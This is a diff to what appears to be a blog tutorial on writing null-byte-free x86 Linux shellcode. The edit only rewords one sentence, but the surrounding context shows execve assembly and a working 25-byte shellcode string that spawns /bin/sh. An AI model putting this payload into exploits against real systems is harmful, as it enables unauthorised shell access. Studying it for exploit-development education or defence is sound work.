@@ -47,7 +47,7 @@ mov al,0x0b			; 0x0b to call sys_execve
 int 0x80				; kernel interrupt
 {% endhighlight %}
 
-To confirm if my code is free of nullbytes, I used this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 25 bytes because the shellcode does not need the prologue
+To confirm if my code is free of nullbytes, I used this site <a href="https://defuse.ca/online-x86-assembler.htm#disassembly" target="_blank">defuse.ca</a>, that translate asm instructions to opcodes or just use objdump, and now I have a shellcode free of nullbytes with 25 bytes.
 
 {% highlight Bash %}
 \x31\xC0\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\x31\xD2\xB0\x0B\xCD\x80
